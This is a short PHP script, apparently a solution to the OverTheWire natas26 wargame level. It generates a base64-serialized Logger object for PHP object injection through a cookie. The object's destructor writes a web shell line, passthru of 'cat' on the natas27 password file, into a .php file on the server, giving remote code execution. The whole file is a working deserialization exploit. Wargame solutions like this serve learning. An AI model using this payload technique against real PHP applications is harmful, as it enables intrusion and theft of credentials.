/* 
 * This is another script used to solve natas26 from http://overthewire.org/wargames/natas/natas27.html.
 * This script contains a malicious exitMsg that is used when the Logger object is destructed on the 
 * natas26 web server back-end. This gives RCE allowing to view that password file. This will print
 * out the cookie that is used to inject into the HTTP POST request using Burp Suite.
*/


<?php

    class Logger
    {
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct()
        {
            $this->initMsg = "#--session started--#\n";
            $this->exitMsg = "<? passthru('cat /etc/natas_webpass/natas27'); ?>\n";
            $this->logFile = "img/natas26.php";
        }                                              
    }

$obj = new Logger();
print base64_encode(serialize($obj))."\n";
?>
